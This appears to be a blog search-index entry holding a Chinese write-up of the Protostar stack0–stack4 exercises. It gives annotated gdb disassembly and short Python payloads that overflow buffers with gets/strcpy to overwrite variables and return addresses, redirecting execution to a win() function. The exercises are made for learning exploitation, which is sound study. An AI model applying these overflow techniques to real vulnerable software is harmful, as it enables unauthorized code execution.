<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title><![CDATA[Protostar Stack Easy]]></title>
    <url>%2F2017%2F09%2F04%2Fprotostar-stack-easy%2F</url>
    <content type="text"><![CDATA[这是给exploit-exercises上protostar的stack题目写的write-up. 由于篇幅限制, 这篇文章只有stack0 - stack4的write-up. stack0首先看一下汇编代码 : 123456789101112131415161718192021222324(gdb) disas mainDump of assembler code for function main:0x080483f4 &lt;main+0&gt;: push ebp0x080483f5 &lt;main+1&gt;: mov ebp,esp0x080483f7 &lt;main+3&gt;: and esp,0xfffffff00x080483fa &lt;main+6&gt;: sub esp,0x60;first pramater modified0x080483fd &lt;main+9&gt;: mov DWORD PTR [esp+0x5c],0x00x08048405 &lt;main+17&gt;: lea eax,[esp+0x1c] ;buf0x08048409 &lt;main+21&gt;: mov DWORD PTR [esp],eax0x0804840c &lt;main+24&gt;: call 0x804830c &lt;gets@plt&gt; ;gets(buf)0x08048411 &lt;main+29&gt;: mov eax,DWORD PTR [esp+0x5c]0x08048415 &lt;main+33&gt;: test eax,eax ;if (flag == 0)?0x08048417 &lt;main+35&gt;: je 0x8048427 &lt;main+51&gt;;puts($0x8048500) if (modified != 0)0x08048419 &lt;main+37&gt;: mov DWORD PTR [esp],0x80485000x08048420 &lt;main+44&gt;: call 0x804832c &lt;puts@plt&gt; 0x08048425 &lt;main+49&gt;: jmp 0x8048433 &lt;main+63&gt;;puts($0x8048500) if (modified == 0)0x08048427 &lt;main+51&gt;: mov DWORD PTR [esp],0x80485290x0804842e &lt;main+58&gt;: call 0x804832c &lt;puts@plt&gt;0x08048433 &lt;main+63&gt;: leave 0x08048434 &lt;main+64&gt;: ret End of assembler dump. 上述代码中, 注释为笔者所加. 下面看一下0x8048500和0x8048529两个字符串的具体内容: 1234(gdb) x/s 0x80485000x8048500: &quot;you have changed the &apos;modified&apos; variable&quot;(gdb) x/s 0x80485290x8048529: &quot;Try again?&quot; 到此, 这个程序的逻辑就已经理清了. 该程序调用gets()函数读取用户输入, 并写入到buf[0x40]中. 由于程序不检查输入, 此处可以发生字符串溢出. 当modified值被修改后输出”you have changed the ‘modified’ variable”, 否则输出”Try again?”. stack0程序的源代码在Here. 我们只要输入超过0x40个字符就能够获取到正确输入. solve1python -c "print 'A'*0x40 + 'modified'" | ./stack0 stack1照样先看汇编代码: 123456789101112131415161718192021222324252627282930313233343536373839404142(gdb) disas mainDump of assembler code for function main:;modified = [esp+0x5c] ;size=0x4;buf = [esp+0x1c] ;size=0x40;argv1 = [esp+0x4]0x08048464 &lt;main+0&gt;: push ebp0x08048465 &lt;main+1&gt;: mov ebp,esp0x08048467 &lt;main+3&gt;: and esp,0xfffffff00x0804846a &lt;main+6&gt;: sub esp,0x60;if argc == 1?0x0804846d &lt;main+9&gt;: cmp DWORD PTR [ebp+0x8],0x10x08048471 &lt;main+13&gt;: jne 0x8048487 &lt;main+35&gt;;call errx(1, $0x80485a0) if (argc == 1)0x08048473 &lt;main+15&gt;: mov DWORD PTR [esp+0x4],0x80485a00x0804847b &lt;main+23&gt;: mov DWORD PTR [esp],0x10x08048482 &lt;main+30&gt;: call 0x8048388 &lt;errx@plt&gt;0x08048487 &lt;main+35&gt;: mov DWORD PTR [esp+0x5c],0x0;argv1 = &amp;argv[1], strcpy(buf, argv1)0x0804848f &lt;main+43&gt;: mov eax,DWORD PTR [ebp+0xc]0x08048492 &lt;main+46&gt;: add eax,0x40x08048495 &lt;main+49&gt;: mov eax,DWORD PTR [eax]0x08048497 &lt;main+51&gt;: mov DWORD PTR [esp+0x4],eax0x0804849b &lt;main+55&gt;: lea eax,[esp+0x1c]0x0804849f &lt;main+59&gt;: mov DWORD PTR [esp],eax0x080484a2 &lt;main+62&gt;: call 0x8048368 &lt;strcpy@plt&gt;;if (modified == &apos;abcd&apos;)?0x080484a7 &lt;main+67&gt;: mov eax,DWORD PTR [esp+0x5c]0x080484ab &lt;main+71&gt;: cmp eax,0x616263640x080484b0 &lt;main+76&gt;: jne 0x80484c0 &lt;main+92&gt;;puts($0x80485bc) and leave if (modified == &apos;abcd&apos;)0x080484b2 &lt;main+78&gt;: mov DWORD PTR [esp],0x80485bc0x080484b9 &lt;main+85&gt;: call 0x8048398 &lt;puts@plt&gt;0x080484be &lt;main+90&gt;: jmp 0x80484d5 &lt;main+113&gt;;printf($0x80485f3, argv1) if (modified != &apos;abcd&apos;)0x080484c0 &lt;main+92&gt;: mov edx,DWORD PTR [esp+0x5c]0x080484c4 &lt;main+96&gt;: mov eax,0x80485f30x080484c9 &lt;main+101&gt;: mov DWORD PTR [esp+0x4],edx0x080484cd &lt;main+105&gt;: mov DWORD PTR [esp],eax0x080484d0 &lt;main+108&gt;: call 0x8048378 &lt;printf@plt&gt;0x080484d5 &lt;main+113&gt;: leave 0x080484d6 &lt;main+114&gt;: ret End of assembler dump. 继续看一下各个字符串的值分别为多少: 123456(gdb) x/s 0x80485f30x80485f3: &quot;Try again, you got 0x%08x\n&quot;(gdb) x/s 0x80485bc0x80485bc: &quot;you have correctly got the variable to the right value&quot;(gdb) x/s 0x80485a00x80485a0: &quot;please specify an argument\n&quot; 该程序首先检查argc是否为1, 若是, 则程序报错. 然后执行strcpy(buf, argv[1]), 如果modified被覆写为”abcd”, 则输出you have correctly got the variable to the right value, 否则视为失败. stack1的源码在Here. solve1python -c "print 'A'*0x40 + 'abcd'" | ./stack1 stack2执行程序,得到以下结果: 1234root@protostar:/opt/protostar/bin# ./stack2stack2: please set the GREENIE environment variableroot@protostar:/opt/protostar/bin# 可以看到, 这个程序要求我们设置GREENIE的环境变量. 那么在这里, 我们就需要用到execve()系统调用, 这道题的exp可以用python写, 也可以用C写, 我用的是python. 其实用C和python代码基本相同, 除了在C中环境变量是由”$ENV_NAME=ENV_VALUE”的指针数组表示, 而在python里, 环境变量的类型是字典. 继续上汇编代码: 123456789101112131415161718192021222324252627282930313233343536373839404142434445(gdb) disas mainDump of assembler code for function main:;env_greenie = [esp+0x5c] ;size = 0x4;modified = [esp+0x58] ;size = 0x4;buf = [esp+0x18] ;size = 0x400x08048494 &lt;main+0&gt;: push ebp0x08048495 &lt;main+1&gt;: mov ebp,esp0x08048497 &lt;main+3&gt;: and esp,0xfffffff00x0804849a &lt;main+6&gt;: sub esp,0x60;env_greenie = getenv(&quot;GREENIE&quot;)0x0804849d &lt;main+9&gt;: mov DWORD PTR [esp],0x80485e00x080484a4 &lt;main+16&gt;: call 0x804837c &lt;getenv@plt&gt;0x080484a9 &lt;main+21&gt;: mov DWORD PTR [esp+0x5c],eax;if (env_greenie == 0)?0x080484ad &lt;main+25&gt;: cmp DWORD PTR [esp+0x5c],0x00x080484b2 &lt;main+30&gt;: jne 0x80484c8 &lt;main+52&gt;;errx(1, &quot;GREENIE&quot;) if (env_greenie == 0)0x080484b4 &lt;main+32&gt;: mov DWORD PTR [esp+0x4],0x80485e80x080484bc &lt;main+40&gt;: mov DWORD PTR [esp],0x10x080484c3 &lt;main+47&gt;: call 0x80483bc &lt;errx@plt&gt;;if (env_greenie != 0)&#123;0x080484c8 &lt;main+52&gt;: mov DWORD PTR [esp+0x58],0x0 ;modified = 0;strcpy(buf, env_greenie) &#125;0x080484d0 &lt;main+60&gt;: mov eax,DWORD PTR [esp+0x5c]0x080484d4 &lt;main+64&gt;: mov DWORD PTR [esp+0x4],eax0x080484d8 &lt;main+68&gt;: lea eax,[esp+0x18]0x080484dc &lt;main+72&gt;: mov DWORD PTR [esp],eax0x080484df &lt;main+75&gt;: call 0x804839c &lt;strcpy@plt&gt;;if (modified = 0x8048618)?0x080484e4 &lt;main+80&gt;: mov eax,DWORD PTR [esp+0x58]0x080484e8 &lt;main+84&gt;: cmp eax,0xd0a0d0a0x080484ed &lt;main+89&gt;: jne 0x80484fd &lt;main+105&gt;;puts($0x8048618) and leave if (modified == 0xd0a0d0a)0x080484ef &lt;main+91&gt;: mov DWORD PTR [esp],0x80486180x080484f6 &lt;main+98&gt;: call 0x80483cc &lt;puts@plt&gt;0x080484fb &lt;main+103&gt;: jmp 0x8048512 &lt;main+126&gt;;printf($0x8048641, midified) if (modified != 0xd0a0d0a)0x080484fd &lt;main+105&gt;: mov edx,DWORD PTR [esp+0x58]0x08048501 &lt;main+109&gt;: mov eax,0x80486410x08048506 &lt;main+114&gt;: mov DWORD PTR [esp+0x4],edx0x0804850a &lt;main+118&gt;: mov DWORD PTR [esp],eax0x0804850d &lt;main+121&gt;: call 0x80483ac &lt;printf@plt&gt;0x08048512 &lt;main+126&gt;: leave 0x08048513 &lt;main+127&gt;: ret End of assembler dump. ​ 各个字符串的值分别如下: 123450x80485e0: &quot;GREENIE&quot;(gdb) x/s0x80485e8: &quot;please set the GREENIE environment variable\n&quot;(gdb) x/s 0x80486180x8048618: &quot;you have correctly modified the variable&quot; ​ 整个程序的流程就是调用strcpy将env_greenie的值复制给buf, 如果midified的值被覆盖, 则输出”you have correctly modified the variable”, 否则视为失败. ​ stack2的源码在Here. solve.py​ 下面是用python写的exp, 由于小端的存取顺序0x0d0a0d0a需要倒过来写: 1234import osenv_greenie = 'A'*0x40 + '\x0a\x0d\x0a\x0d'envp = &#123;"GREENIE": str(env_greenie)&#125;os.execve("./stack2", ["./stack2"], envp) stack3还是先上汇编代码, 下面这段是main函数的汇编代码: 123456789101112131415161718192021222324252627282930(gdb) disas mainDump of assembler code for function main:;midified = [esp+0x5c];buf = [esp+0x1c]0x08048438 &lt;main+0&gt;: push ebp0x08048439 &lt;main+1&gt;: mov ebp,esp0x0804843b &lt;main+3&gt;: and esp,0xfffffff00x0804843e &lt;main+6&gt;: sub esp,0x600x08048441 &lt;main+9&gt;: mov DWORD PTR [esp+0x5c],0x0 ;midified = 0;gets(buf)0x08048449 &lt;main+17&gt;: lea eax,[esp+0x1c]0x0804844d &lt;main+21&gt;: mov DWORD PTR [esp],eax0x08048450 &lt;main+24&gt;: call 0x8048330 &lt;gets@plt&gt;;if (modified == 0)?0x08048455 &lt;main+29&gt;: cmp DWORD PTR [esp+0x5c],0x0;leave if if (modified == 0)0x0804845a &lt;main+34&gt;: je 0x8048477 &lt;main+63&gt;;if (modified != 0)&#123;;printf($0x8048560, midified)0x0804845c &lt;main+36&gt;: mov eax,0x80485600x08048461 &lt;main+41&gt;: mov edx,DWORD PTR [esp+0x5c]0x08048465 &lt;main+45&gt;: mov DWORD PTR [esp+0x4],edx0x08048469 &lt;main+49&gt;: mov DWORD PTR [esp],eax0x0804846c &lt;main+52&gt;: call 0x8048350 &lt;printf@plt&gt;;call(modified) &#125;0x08048471 &lt;main+57&gt;: mov eax,DWORD PTR [esp+0x5c]0x08048475 &lt;main+61&gt;: call eax0x08048477 &lt;main+63&gt;: leave 0x08048478 &lt;main+64&gt;: ret End of assembler dump. 字符串的值如下: 12(gdb) x/s 0x80485600x8048560: &quot;calling function pointer, jumping to 0x%08x\n&quot; 可以看到, 若modified被覆盖, 函数将跳转midified, 我们只要把modified覆盖成我们想要跳转的地址即可. 查看程序的C源码, 可以看到源码中定义了一个win()函数. 12(gdb) info addr winSymbol &quot;win&quot; is a function at address 0x8048424. 所以0x8048424就是我们要跳转的地址. stack2的源码在Here. solve1python -c "print 'A'*0x40 + '\x24\x84\x04\x08'" | ./stack3 stack4这道题的代码有点短, 代码如下: 12345678910111213Dump of assembler code for function main:;buf = [esp+0x10] ;size = 0x400x08048408 &lt;main+0&gt;: push ebp0x08048409 &lt;main+1&gt;: mov ebp,esp0x0804840b &lt;main+3&gt;: and esp,0xfffffff00x0804840e &lt;main+6&gt;: sub esp,0x50;gets(buf)0x08048411 &lt;main+9&gt;: lea eax,[esp+0x10]0x08048415 &lt;main+13&gt;: mov DWORD PTR [esp],eax0x08048418 &lt;main+16&gt;: call 0x804830c &lt;gets@plt&gt;0x0804841d &lt;main+21&gt;: leave 0x0804841e &lt;main+22&gt;: ret End of assembler dump. 该程序调用gets函数读取用户输入, 然后退出. 我们可以覆写函数的返回地址, 让函数返回到win函数的入口地址. 用gdb查看win函数的地址为0x80483f4, 调试程序, 查看buf的地址离要覆盖的地址之间的偏移. buf的起始地址在$esp+0x10 == 0xbffffc50. retaddr的地址为$ebp+0x4 == 0xbffffc9c, 偏移为0x4c. 1234(gdb) x/x $esp+0x100xbffffc50: 0xb7fd7ff4(gdb) x/x $ebp+0x40xbffffc9c: 0xb7eadc76 solve1python -c "print 'A'*0x4c + '\xf4\x83\x04\x08'" | ./stack4 运行上面这行命令以后, 我们会得到”code flow successfully changed”的输出和一个Segmentation fault的提示, 这是正常的, 因为我们覆盖了main函数的返回地址使得程序无法正常退出了. summary以上的五道题目都是非常简单的栈溢出题, 程序没有设置任何保护机制, 也不需要用到什么技巧就能够破解. 有一点要注明的是, 上面的代码块中有些语法为shell的代码块我写了python, 因为Hexo默认不支持shell, 也不支持汇编…]]></content>
      <categories>
        <category>write-up</category>
      </categories>
      <tags>
        <tag>stack overflow</tag>
        <tag>pwn</tag>
      </tags>
  </entry>
</search>
